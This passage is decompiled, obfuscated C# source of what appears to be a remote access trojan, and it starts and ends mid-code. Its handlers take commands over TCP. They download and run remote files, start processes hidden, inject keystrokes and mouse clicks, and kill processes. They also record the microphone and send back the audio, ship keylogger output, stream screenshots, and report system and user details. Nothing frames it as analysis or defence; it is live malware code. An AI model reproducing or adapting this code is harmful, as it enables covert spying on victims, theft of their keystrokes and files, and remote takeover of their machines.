				ProjectData.SetProjectError(projectError);
				try
				{
					W8OwNO3NTNFTWI9GPHiqPSPE114();
					gJrlNEyq80.WriteLine("/ERROR/");
					gJrlNEyq80.Flush();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	private void QHilPQQNPl8b174(object Tempdata)
	{
		checked
		{
			try
			{
				string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "*" }, (string[])null, (Type[])null, (bool[])null);
				string text = array.GetValue(1)!.ToString();
				string text2 = array.GetValue(0)!.ToString();
				if (!Directory.Exists(text2))
				{
					Directory.CreateDirectory(text2);
				}
				string[] array2 = (string[])NewLateBinding.LateGet(NewLateBinding.LateGet(array.GetValue(2), (Type)null, "Trim", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Split", new object[1] { " " }, (string[])null, (Type[])null, (bool[])null);
				byte[] array3 = new byte[array2.GetUpperBound(0) + 1];
				int num = array2.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					array3[i] = Conversions.ToByte(array2.GetValue(i));
				}
				if (array2.Length < 32768)
				{
					D7wigX73lFOj46 = text2 + text;
					if (File.Exists(D7wigX73lFOj46))
					{
						ssqwzwagQoOhjET2PiWIbjP3122(1);
						try
						{
							File.Delete(D7wigX73lFOj46);
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							try
							{
								ssqwzwagQoOhjET2PiWIbjP3122(1);
								fileStream_0.Flush();
								fileStream_0.Close();
								fxLoAQbZrLKM41.Close();
								File.Delete(D7wigX73lFOj46);
							}
							catch (Exception projectError2)
							{
								ProjectData.SetProjectError(projectError2);
								try
								{
									ssqwzwagQoOhjET2PiWIbjP3122(1);
								}
								catch (Exception projectError3)
								{
									ProjectData.SetProjectError(projectError3);
									File.Delete(D7wigX73lFOj46);
									ProjectData.ClearProjectError();
								}
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
					}
					fileStream_0 = new FileStream(D7wigX73lFOj46, FileMode.CreateNew);
					fxLoAQbZrLKM41 = new BinaryWriter(fileStream_0);
					v21WvnBSTCwt38 = new byte[array2.Length - 1 + 1];
					v21WvnBSTCwt38 = array3;
					fxLoAQbZrLKM41.Write(v21WvnBSTCwt38);
					fileStream_0.Flush();
					fileStream_0.Close();
					fxLoAQbZrLKM41.Close();
					return;
				}
				D7wigX73lFOj46 = text2 + text;
				if (File.Exists(D7wigX73lFOj46))
				{
					ssqwzwagQoOhjET2PiWIbjP3122(1);
					try
					{
						File.Delete(D7wigX73lFOj46);
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						try
						{
							ssqwzwagQoOhjET2PiWIbjP3122(1);
							fileStream_0.Flush();
							fileStream_0.Close();
							fxLoAQbZrLKM41.Close();
							File.Delete(D7wigX73lFOj46);
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							try
							{
								ssqwzwagQoOhjET2PiWIbjP3122(1);
							}
							catch (Exception projectError6)
							{
								ProjectData.SetProjectError(projectError6);
								File.Delete(D7wigX73lFOj46);
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
						ProjectData.ClearProjectError();
					}
				}
				fileStream_0 = new FileStream(D7wigX73lFOj46, FileMode.CreateNew);
				fxLoAQbZrLKM41 = new BinaryWriter(fileStream_0);
				v21WvnBSTCwt38 = new byte[array2.Length - 1 + 1];
				v21WvnBSTCwt38 = array3;
				fxLoAQbZrLKM41.Write(v21WvnBSTCwt38);
				fileStream_0.Flush();
				gJrlNEyq80.WriteLine("/ANOTHEPK/");
				gJrlNEyq80.Flush();
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				try
				{
					fileStream_0.Flush();
					fileStream_0.Close();
					fxLoAQbZrLKM41.Close();
					gJrlNEyq80.WriteLine("/ERRORUPL/");
					gJrlNEyq80.Flush();
				}
				catch (Exception projectError8)
				{
					ProjectData.SetProjectError(projectError8);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	private void method_12(object Tempdata)
	{
		checked
		{
			try
			{
				string[] array = (string[])NewLateBinding.LateGet(NewLateBinding.LateGet(Tempdata, (Type)null, "Trim", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Split", new object[1] { " " }, (string[])null, (Type[])null, (bool[])null);
				byte[] array2 = new byte[array.GetUpperBound(0) + 1];
				int num = array.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					array2[i] = Conversions.ToByte(array.GetValue(i));
				}
				v21WvnBSTCwt38 = new byte[array.Length - 1 + 1];
				v21WvnBSTCwt38 = array2;
				fxLoAQbZrLKM41.Write(v21WvnBSTCwt38);
				fileStream_0.Flush();
				gJrlNEyq80.WriteLine("/ANOTHEPK/");
				gJrlNEyq80.Flush();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				try
				{
					fileStream_0.Flush();
					fileStream_0.Close();
					fxLoAQbZrLKM41.Close();
					gJrlNEyq80.WriteLine("/ERRORUPL/");
					gJrlNEyq80.Flush();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	private void oqxUMTG3qYKs176(object Tempdata)
	{
		checked
		{
			try
			{
				if (Operators.ConditionalCompareObjectNotEqual(Tempdata, (object)"", false))
				{
					string[] array = (string[])NewLateBinding.LateGet(NewLateBinding.LateGet(Tempdata, (Type)null, "Trim", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Split", new object[1] { " " }, (string[])null, (Type[])null, (bool[])null);
					byte[] array2 = new byte[array.GetUpperBound(0) + 1];
					int num = array.Length - 1;
					for (int i = 0; i <= num; i++)
					{
						array2[i] = Conversions.ToByte(array.GetValue(i));
					}
					v21WvnBSTCwt38 = new byte[array.Length - 1 + 1];
					v21WvnBSTCwt38 = array2;
					fxLoAQbZrLKM41.Write(v21WvnBSTCwt38);
					fileStream_0.Flush();
					fileStream_0.Close();
					fxLoAQbZrLKM41.Close();
				}
				else
				{
					fileStream_0.Flush();
					fileStream_0.Close();
					fxLoAQbZrLKM41.Close();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				try
				{
					fileStream_0.Flush();
					fileStream_0.Close();
					fxLoAQbZrLKM41.Close();
					gJrlNEyq80.WriteLine("/ERRORUPL/");
					gJrlNEyq80.Flush();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	public static extern IntPtr GetMessageExtraInfo();

	private void uKMOZQ2FneWo178(object Tempdata)
	{
		try
		{
			if (Operators.ConditionalCompareObjectEqual(Tempdata, (object)"right", false))
			{
				mouse_event(8, 0, 0, 0, (int)GetMessageExtraInfo());
				mouse_event(16, 0, 0, 0, (int)GetMessageExtraInfo());
			}
			else if (Operators.ConditionalCompareObjectEqual(Tempdata, (object)"left", false))
			{
				mouse_event(2, 0, 0, 0, (int)GetMessageExtraInfo());
				mouse_event(4, 0, 0, 0, (int)GetMessageExtraInfo());
			}
			else if (Operators.ConditionalCompareObjectEqual(Tempdata, (object)"middle", false))
			{
				mouse_event(32, 0, 0, 0, (int)GetMessageExtraInfo());
				mouse_event(64, 0, 0, 0, (int)GetMessageExtraInfo());
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void iV0VE4K6JG6z179(object Tempdata)
	{
		checked
		{
			try
			{
				string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { '*' }, (string[])null, (Type[])null, (bool[])null);
				int x = (int)Math.Round(Math.Floor(double.Parse(array[0])));
				int y = (int)Math.Round(Math.Floor(double.Parse(array[1])));
				ref Point reference = ref qsFVN1CoK26Y52;
				reference = new Point(x, y);
				Cursor.set_Position(qsFVN1CoK26Y52);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void WLtpNqq27Ip2180()
	{
		try
		{
			if (bY0svbBqzXhk12)
			{
				string lpstrCommand = "open new type waveaudio alias capture";
				string lpstrReturnString = null;
				mciSendStringA(ref lpstrCommand, ref lpstrReturnString, 0, 0);
				lpstrReturnString = "set capture samplespersec 6000 channels 8 bitspersample 1 alignment 1 bytespersec 6000";
				lpstrCommand = null;
				mciSendStringA(ref lpstrReturnString, ref lpstrCommand, 0, 0);
				lpstrReturnString = "record capture";
				lpstrCommand = null;
				mciSendStringA(ref lpstrReturnString, ref lpstrCommand, 0, 0);
				ssqwzwagQoOhjET2PiWIbjP3122(5);
				lpstrReturnString = "save capture test.wav";
				lpstrCommand = null;
				mciSendStringA(ref lpstrReturnString, ref lpstrCommand, 0, 0);
				lpstrReturnString = "close capture";
				lpstrCommand = null;
				mciSendStringA(ref lpstrReturnString, ref lpstrCommand, 0, 0);
				try
				{
					gmvd9wR170.WriteLine("/SOUNDREC/" + Convert.ToBase64String(((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_FileSystem().ReadAllBytes("test.wav")));
					gmvd9wR170.Flush();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_FileSystem().DeleteFile(Application.get_StartupPath() + "\\test.wav");
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void method_13(object Tempdata)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "*" }, (string[])null, (Type[])null, (bool[])null);
			string text = array.GetValue(1)!.ToString();
			if (!Directory.Exists(array.GetValue(0)!.ToString()))
			{
				Directory.CreateDirectory(array.GetValue(0)!.ToString());
			}
			if (!File.Exists(array.GetValue(0)!.ToString() + text))
			{
				string text2 = array.GetValue(2)!.ToString();
				((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Network().DownloadFile(text2, array.GetValue(0)!.ToString() + text, (string)null, (string)null, false, 100000, true);
				ssqwzwagQoOhjET2PiWIbjP3122(5);
			}
			int num = 0;
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (process.ProcessName.StartsWith("winupdate"))
				{
					num = 1;
				}
			}
			if (num == 0)
			{
				Process.Start(array.GetValue(0)!.ToString() + text);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void crfyBc5ODcRe182(object Tempdata)
	{
		try
		{
			SendKeys.SendWait(Conversions.ToString(Tempdata));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void nCRXNUhAwXOL183()
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		try
		{
			S2674QCQaR2b57 = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem");
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = S2674QCQaR2b57.Get().GetEnumerator();
				while (enumerator.MoveNext())
				{
					object current = enumerator.get_Current();
					JzHaDMy0fw3v58 = NewLateBinding.LateIndexGet(current, new object[1] { "manufacturer" }, (string[])null).ToString();
					MulNrNvgBdvd59 = NewLateBinding.LateIndexGet(current, new object[1] { "model" }, (string[])null).ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text = null;
			text = "/INFOPCPC/";
			text = text + "Computer Name = " + ((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Name() + "±";
			text = text + "Computer Manufacturer = " + Manufacturer + "±";
			text = text + "Computer Model = " + Model + "±";
			text = text + "OS Name = " + ((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Info().get_OSFullName() + "±";
			text = text + "OS Version = " + ((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Info().get_OSVersion() + "±";
			text = text + "System Type = " + ((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Info().get_OSPlatform() + "±";
			text = text + "Total Physical Memory = " + Conversions.ToString(((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Info().get_TotalPhysicalMemory()) + "±";
			text = text + "Total Virtual Memory = " + Conversions.ToString(((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Info().get_TotalVirtualMemory()) + "±";
			text = text + "Available Physical Memory = " + Conversions.ToString(((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Info().get_AvailablePhysicalMemory()) + "±";
			text = text + "Available Virtual Memory = " + Conversions.ToString(((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Info().get_AvailableVirtualMemory()) + "±";
			text = text + "Username = " + N16OftqaR9kA1ge5r9p5B2.User.get_Name() + "±";
			text = text + "System Directory = " + Environment.SystemDirectory;
			Yc568CBp85.WriteLine(text);
			Yc568CBp85.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_14(object t)
	{
		try
		{
			if (Conversions.ToBoolean(t))
			{
				((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_FileSystem().WriteAllText(Path.GetTempPath() + "logdll.txt", "", false);
				return;
			}
			string text = ((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_FileSystem().ReadAllText(Path.GetTempPath() + "logdll.txt");
			if (text.Length > 2000000)
			{
				text = MbYOg375zXnJrPQtT9UAfZib112("Log file too big", "&%#@?,:*");
				streamWriter_0.WriteLine("/KEYSLOGG/" + text);
				streamWriter_0.Flush();
			}
			else
			{
				text = MbYOg375zXnJrPQtT9UAfZib112(text, "&%#@?,:*");
				streamWriter_0.WriteLine("/KEYSLOGG/" + text);
				streamWriter_0.Flush();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void bSqVDBpU1Pck185(object t)
	{
		try
		{
			if (Conversions.ToBoolean(t))
			{
				string lpstrCommand = "Set CDaudio door open";
				mciExecute(ref lpstrCommand);
			}
			else
			{
				string lpstrCommand = "Set CDaudio door closed";
				mciExecute(ref lpstrCommand);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void c7LQEaIeCtxq186(object Tempdata)
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = Conversions.ToString(Tempdata);
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_15(object Tempdata)
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = Conversions.ToString(Tempdata);
			process.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
			process.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void tlXUyUKaYPrt188(object Tempdata)
	{
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008b: Expected O, but got Unknown
		//IL_010c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "¦" }, (string[])null, (Type[])null, (bool[])null);
			string text = null;
			EncoderParameters val = new EncoderParameters(1);
			val.get_Param()[0] = new EncoderParameter(Encoder.Quality, (long)int.Parse(array[0]));
			ImageCodecInfo val2 = cHIqm6FyX4IDAfKIBe0B7Gnm106("image/jpeg");
			int num = int.Parse(array[1]);
			int num2 = 0;
			Bitmap val3 = new Bitmap(OVTDrfYXXtVl53.Width, OVTDrfYXXtVl53.Height, (PixelFormat)135173);
			if (OVTDrfYXXtVl53.Width < num)
			{
				num = OVTDrfYXXtVl53.Width;
			}
			switch (num)
			{
			case 1280:
				num2 = 1024;
				break;
			case 1024:
				num2 = 768;
				break;
			case 800:
				num2 = 600;
				break;
			case 640:
				num2 = 480;
				break;
			case 320:
				num2 = 240;
				break;
			}
			Bitmap val4 = new Bitmap(num, num2, (PixelFormat)135173);
			Graphics val5 = Graphics.FromImage((Image)(object)val3);
			val5.CopyFromScreen(OVTDrfYXXtVl53.X, OVTDrfYXXtVl53.Y, 0, 0, OVTDrfYXXtVl53.Size, (CopyPixelOperation)13369376);
			val5 = Graphics.FromImage((Image)(object)val4);
			val5.set_InterpolationMode((InterpolationMode)7);
			val5.set_CompositingQuality((CompositingQuality)2);
			val5.DrawImage((Image)(object)val3, 0, 0, num, num2);
			MemoryStream memoryStream = new MemoryStream();
			if (Conversions.ToDouble(array[0]) > 75.0)
			{
				((Image)val4).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
			}
			else
			{
				((Image)val4).Save((Stream)memoryStream, val2, val);
			}
			memoryStream.Capacity = checked((int)memoryStream.Length);
			byte[] buffer = memoryStream.GetBuffer();
			text = Convert.ToBase64String(buffer);
			_ = text.Length;
			((Image)val3).Dispose();
			((Image)val4).Dispose();
			memoryStream.Dispose();
			memoryStream.Close();
			val5.Dispose();
			buffer = null;
			gmvd9wR170.WriteLine("/STARDESK/" + text);
			gmvd9wR170.Flush();
			text = null;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void MZmQwZIIkZSc189(object Tempdata)
	{
		try
		{
			int processId = int.Parse(Conversions.ToString(Tempdata));
			Process processById = Process.GetProcessById(processId);
			try
			{
				if (processById != null)
				{
					processById.Kill();
					BQwhZ5yk135.WriteLine("/REFRESHP/");
					BQwhZ5yk135.Flush();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				try
				{
					Process.EnterDebugMode();
					processById.Kill();
					Process.LeaveDebugMode();
					BQwhZ5yk135.WriteLine("/REFRESHP/");
					BQwhZ5yk135.Flush();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	private void njwaC4WGmPmi190(object Tempdata)
	{
		try
		{
			object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("SAPI.SpVoice", ""));
			object[] array = new object[1] { RuntimeHelpers.GetObjectValue(Tempdata) };
			bool[] array2 = new bool[1] { true };
			NewLateBinding.LateCall(objectValue, (Type)null, "Speak", array, (string[])null, (Type[])null, array2, true);
			if (array2[0])
			{
				Tempdata = RuntimeHelpers.GetObjectValue(array[0]);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public bool dNFIImscZJio191(string addrrr)
	{
		bool flag = false;
		try
		{
			string pattern = "^([1-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])(\\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])){3}$";
			Regex regex = new Regex(pattern);
			flag = Operators.CompareString(addrrr, "", false) != 0 && regex.IsMatch(addrrr, 0);
			return flag;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = flag;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void unBpN3AttLxf192()
	{
		string text = null;
		try
		{
			while (idgAPcRt68.Connected)
			{
				text = streamReader_1.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					ssqwzwagQoOhjET2PiWIbjP3122(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/DOWNDESK/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread7 = new Thread(tlXUyUKaYPrt188);
						thread7.Start(text);
					}
					catch (Exception projectError11)
					{
						ProjectData.SetProjectError(projectError11);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STARTSQL/":
					try
					{
						gmvd9wR170.WriteLine("/STARTSQL/" + Conversions.ToString(Screen.get_PrimaryScreen().get_Bounds().Width) + "*" + Conversions.ToString(Screen.get_PrimaryScreen().get_Bounds().Height));
						gmvd9wR170.Flush();
					}
					catch (Exception projectError10)
					{
						ProjectData.SetProjectError(projectError10);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SENDKEYB/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread6 = new Thread(crfyBc5ODcRe182);
						thread6.Start(text);
					}
					catch (Exception projectError9)
					{
						ProjectData.SetProjectError(projectError9);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SETMOUSE/":
				{
					text = Strings.Mid(text, 11, Strings.Len(text));
					Thread thread5 = new Thread(iV0VE4K6JG6z179);
					thread5.Start(text);
					break;
				}
				case "/SETCLICK/":
				{
					text = Strings.Mid(text, 11, Strings.Len(text));
					Thread thread4 = new Thread(uKMOZQ2FneWo178);
					thread4.Start(text);
					break;
				}
				case "/STARTSQN/":
					try
					{
						OUfrH25Yg3D314 = true;
						gmvd9wR170.WriteLine("/STARTSQN/");
						gmvd9wR170.Flush();
					}
					catch (Exception projectError8)
					{
						ProjectData.SetProjectError(projectError8);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STARTSEQ/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread3 = new Thread(method_7);
						thread3.Start(text);
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STARTSEF/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread2 = new Thread(method_8);
						thread2.Start(text);
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STOPPSEQ/":
					try
					{
						OUfrH25Yg3D314 = false;
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STOPDESK/":
					try
					{
						OUfrH25Yg3D314 = false;
						gmvd9wR170.Dispose();
						streamReader_1.Dispose();
						RlTBiBnU69.Dispose();
						idgAPcRt68.Close();
						return;
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SOUNDREC/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						bY0svbBqzXhk12 = true;
						Thread thread = new Thread(WLtpNqq27Ip2180);
						thread.Start();
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SOUNDSTP/":
					try
					{
						bY0svbBqzXhk12 = false;
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				default:
					try
					{
						gmvd9wR170.WriteLine("/STARDESK/");
						gmvd9wR170.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError12)
		{
			ProjectData.SetProjectError(projectError12);
			ProjectData.ClearProjectError();
		}
	}

	private void oAyTSL7XC4DJ193()
	{
		string text = null;
		checked
		{
			try
			{
				while (DZYDaHEu73.Connected)
				{
					text = cOUZWr2D76.ReadLine();
					if (Operators.CompareString(text, (string)null, false) == 0)
					{
						ssqwzwagQoOhjET2PiWIbjP3122(1);
					}
					switch (Strings.Left(text, 10))
					{
					case "/WEBLISTC/":
						try
						{
							string lpszName = Strings.Space(100);
							string lpszVer = Strings.Space(100);
							int num = 0;
							StringBuilder stringBuilder = new StringBuilder();
							bool flag;
							do
							{
								if (flag = capGetDriverDescriptionA((short)num, ref lpszName, 100, ref lpszVer, 100))
								{
									stringBuilder.Append(lpszName.Trim() + "¦");
								}
								num++;
							}
							while (flag);
							mfw1bmIe75.WriteLine("/WEBLISTC/" + stringBuilder.ToString());
							mfw1bmIe75.Flush();
						}
						catch (Exception projectError6)
						{
							ProjectData.SetProjectError(projectError6);
							ProjectData.ClearProjectError();
						}
						break;
					case "/WEBSTART/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							cg3aiWnJJ39C20 = "Connect";
							pIFr3cCEUvmc22 = "";
							laQ5GCP4164 = new Thread(DxQnnzm1E1pbS2UBcIFW1ktc147);
							laQ5GCP4164.Start(text);
						}
						catch (Exception projectError7)
						{
							ProjectData.SetProjectError(projectError7);
							ProjectData.ClearProjectError();
						}
						break;
					case "/WEBIMAGA/":
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						string text2 = text;
						if (Operators.CompareString(text2, "0", false) == 0)
						{
							pqQVcHfs166 = true;
						}
						else if (Operators.CompareString(text2, "1", false) == 0)
						{
							UXUEp0AC167 = true;
						}
						break;
					}
					case "/WEBIMAGE/":
						try
						{
							switch (Strings.Mid(text, 11, Strings.Len(text)))
							{
							case "Image":
								huqwYcifJHbK21 = "Image";
								break;
							case "Capture":
								huqwYcifJHbK21 = "Capture";
								break;
							case "Capture2":
								huqwYcifJHbK21 = "Capture2";
								break;
							}
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							ProjectData.ClearProjectError();
						}
						break;
					case "/WEBSTOPP/":
						try
						{
							pqQVcHfs166 = false;
							UXUEp0AC167 = false;
							huqwYcifJHbK21 = "";
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
						}
						break;
					case "/WEBDISCO/":
						try
						{
							pqQVcHfs166 = false;
							UXUEp0AC167 = false;
							huqwYcifJHbK21 = null;
							pIFr3cCEUvmc22 = "Disconnect";
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							ProjectData.ClearProjectError();
						}
						break;
					case "/STOPDESK/":
						try
						{
							pqQVcHfs166 = false;
							UXUEp0AC167 = false;
							huqwYcifJHbK21 = null;
							pIFr3cCEUvmc22 = "Disconnect";
							mfw1bmIe75.Dispose();
							cOUZWr2D76.Dispose();
							Rl4yTP1M74.Dispose();
							DZYDaHEu73.Close();
							return;
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
						break;
					default:
						ssqwzwagQoOhjET2PiWIbjP3122(1);
						try
						{
							mfw1bmIe75.WriteLine("/WEBLISTC/");
							mfw1bmIe75.Flush();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						break;
					}
				}
			}
			catch (Exception projectError8)
			{
				ProjectData.SetProjectError(projectError8);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void j0ZXxFcD07Fe194()
	{
		string text = null;
		checked
		{
			try
			{
				while (tcpClient_1.Connected)
				{
					text = jrsygRe881.ReadLine();
					if (Operators.CompareString(text, (string)null, false) == 0)
					{
						ssqwzwagQoOhjET2PiWIbjP3122(1);
					}
					switch (Strings.Left(text, 10))
					{
					case "/IPREVIEW/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							Image val = null;
							Image val2 = null;
							try
							{
								val2 = Image.FromFile(text);
								string text4 = null;
								if (val2 != null)
								{
									double num2 = (double)val2.get_Size().Width / (double)val2.get_Size().Height;
									double num3 = (double)val2.get_Size().Height / (double)val2.get_Size().Width;
									val = ((val2.get_Size().Width <= val2.get_Size().Height) ? val2.GetThumbnailImage((int)Math.Round(200.0 / num3), 200, (GetThumbnailImageAbort)null, default(IntPtr)) : val2.GetThumbnailImage(200, (int)Math.Round(200.0 / num2), (GetThumbnailImageAbort)null, default(IntPtr)));
									MemoryStream memoryStream = new MemoryStream();
									val.Save((Stream)memoryStream, ImageFormat.get_Jpeg());
									memoryStream.Capacity = (int)memoryStream.Length;
									byte[] buffer = memoryStream.GetBuffer();
									text4 = Convert.ToBase64String(buffer);
									gJrlNEyq80.WriteLine("/IPREVIEW/" + text4);
									gJrlNEyq80.Flush();
									memoryStream.Dispose();
									memoryStream.Close();
									val2.Dispose();
								}
							}
							catch (Exception projectError13)
							{
								ProjectData.SetProjectError(projectError13);
								ProjectData.ClearProjectError();
							}
						}
						catch (Exception projectError14)
						{
							ProjectData.SetProjectError(projectError14);
							ProjectData.ClearProjectError();
						}
						break;
					case "/STOPDOWN/":
						try
						{
							W8OwNO3NTNFTWI9GPHiqPSPE114();
						}
						catch (Exception projectError12)
						{
							ProjectData.SetProjectError(projectError12);
							ProjectData.ClearProjectError();
						}
						break;
					case "/LISTDRVS/":
						try
						{
							Thread thread10 = new Thread(method_11);
							thread10.Start(gJrlNEyq80);
						}
						catch (Exception projectError11)
						{
							ProjectData.SetProjectError(projectError11);
							ProjectData.ClearProjectError();
						}
						break;
					case "/LISTDIRS/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							Thread thread9 = new Thread(LOdGRXGSaazb164);
							thread9.Start(text);
						}
						catch (Exception projectError10)
						{
							ProjectData.SetProjectError(projectError10);
							gJrlNEyq80.WriteLine("/ERRORDIR/");
